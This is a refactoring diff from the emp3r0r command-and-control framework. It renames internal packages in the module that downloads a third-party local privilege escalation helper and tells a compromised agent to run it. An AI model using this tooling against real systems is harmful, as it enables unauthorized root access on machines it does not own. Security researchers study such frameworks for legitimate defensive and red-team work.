@@ -5,9 +5,9 @@ import (
 
 	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/agents"
 	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/tools"
-	"github.com/jm33-m0/emp3r0r/core/internal/emp3r0r_def"
-	"github.com/jm33-m0/emp3r0r/core/internal/runtime_def"
-	"github.com/jm33-m0/emp3r0r/core/internal/tun"
+	"github.com/jm33-m0/emp3r0r/core/internal/def"
+	"github.com/jm33-m0/emp3r0r/core/internal/live"
+	"github.com/jm33-m0/emp3r0r/core/internal/transport"
 	"github.com/jm33-m0/emp3r0r/core/lib/logging"
 )
 
@@ -24,12 +24,12 @@ var LPEHelperURLs = map[string]string{
 func moduleLPE() {
 	go func() {
 		// target
-		target := runtime_def.ActiveAgent
+		target := live.ActiveAgent
 		if target == nil {
 			logging.Errorf("Target not exist")
 			return
 		}
-		helperOpt, ok := runtime_def.AvailableModuleOptions["lpe_helper"]
+		helperOpt, ok := live.AvailableModuleOptions["lpe_helper"]
 		if !ok {
 			logging.Errorf("Option 'lpe_helper' not found")
 			return
@@ -38,7 +38,7 @@ func moduleLPE() {
 
 		// download third-party LPE helper
 		logging.Infof("Updating local LPE helper...")
-		err := tools.DownloadFile(LPEHelperURLs[helperName], runtime_def.Temp+tun.WWW+helperName)
+		err := tools.DownloadFile(LPEHelperURLs[helperName], live.Temp+transport.WWW+helperName)
 		if err != nil {
 			logging.Errorf("Failed to download %s: %v", helperName, err)
 			return
@@ -46,7 +46,7 @@ func moduleLPE() {
 
 		// exec
 		logging.Printf("This can take some time, please be patient")
-		cmd := fmt.Sprintf("%s --script_name %s", emp3r0r_def.C2CmdLPE, helperName)
+		cmd := fmt.Sprintf("%s --script_name %s", def.C2CmdLPE, helperName)
 		logging.Infof("Running %s", cmd)
 		err = agents.SendCmd(cmd, "", target)
 		if err != nil {
